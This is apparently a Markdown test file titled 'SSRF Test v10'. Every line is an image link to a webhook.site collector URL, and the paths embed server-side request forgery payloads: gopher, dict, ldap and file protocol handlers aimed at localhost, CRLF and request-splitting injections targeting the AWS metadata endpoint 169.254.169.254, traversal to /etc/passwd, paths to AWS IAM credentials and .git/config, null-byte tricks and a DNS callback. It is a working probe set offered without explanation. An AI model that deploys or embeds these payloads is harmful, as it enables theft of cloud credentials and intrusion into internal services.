# SSRF Test v10 - Protocol & Redirect Chain Tests

## Baseline
![v10-canary](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/v10-canary.gif)

## Protocol Handlers in Path
![proto1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/file://localhost/etc/passwd.gif)
![proto2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/gopher://127.0.0.1:25/1EHLO.gif)
![proto3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/dict://127.0.0.1:6379/info.gif)
![proto4](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/ldap://127.0.0.1:389/dc=example.gif)

## CRLF + Host Header Injection Combined
![crlf1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/inject%0d%0aHost:%20169.254.169.254%0d%0a.gif)
![crlf2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/split%0d%0a%0d%0aGET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a.gif)
![crlf3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/x%0d%0aX-Forwarded-Host:%20internal-api.github.com%0d%0a.gif)

## Path Traversal Sequences
![trav1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/..%2f..%2f..%2fetc%2fpasswd)
![trav2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/....//....//....//etc//passwd)
![trav3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/..%252f..%252f..%252fetc%252fpasswd)
![trav4](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/%2e%2e/%2e%2e/%2e%2e/etc/passwd)

## IPv6 Localhost Variants
![ipv6a](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/ipv6-bracket-%5B::1%5D.gif)
![ipv6b](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/ipv6-full-%5B::ffff:127.0.0.1%5D.gif)
![ipv6c](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/ipv6-0-%5B::ffff:0:0%5D.gif)

## Null Byte Variants
![null1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/null1%00169.254.169.254.gif)
![null2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/null2.gif%00.evil.com)
![null3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/null3%00%0d%0aHost:%20internal.gif)

## Request Splitting via Double CRLF
![split1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/req1%0d%0a%0d%0aABC.gif)
![split2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/req2%0a%0aABC.gif)
![split3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/req3%0d%0d%0aABC.gif)

## AWS Metadata Path Tests
![aws1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/latest/meta-data/iam/security-credentials/)
![aws2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/latest/dynamic/instance-identity/document)
![aws3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/latest/user-data)

## Internal Service Paths
![int1](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/admin)
![int2](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/.git/config)
![int3](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/server-status)
![int4](https://webhook.site/9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc/.well-known/openid-configuration)

## DNS Test
![dns1](https://v10-test.9f2029fd-e8c9-44f1-9dbc-5d5ee1d265fc.dnshook.site/dns.gif)

## Version Marker
Timestamp: v10-protocol-path-tests
